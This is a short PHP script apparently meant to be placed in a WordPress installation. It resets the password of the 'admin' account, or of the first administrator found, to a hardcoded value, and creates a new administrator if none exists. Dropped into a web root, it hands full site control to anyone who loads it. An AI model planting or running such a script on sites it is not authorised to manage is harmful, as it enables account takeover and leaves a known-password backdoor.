<?php
require_once 'wp-load.php';
$username = 'admin';
$new_pass = 'novacraft_2026!';
$user = get_user_by('login', $username);
if (!$user) {
    // Try to find any admin
    $admins = get_users(['role' => 'administrator']);
    if (!empty($admins)) {
        $user = $admins[0];
        $username = $user->user_login;
    }
}

if ($user) {
    wp_set_password($new_pass, $user->ID);
    echo "SUCCESS: " . $username . "\n";
} else {
    $user_id = wp_create_user($username, $new_pass, 'admin@novacraft.ru');
    $user = new WP_User($user_id);
    $user->set_role('administrator');
    echo "SUCCESS_NEW: " . $username . "\n";
}
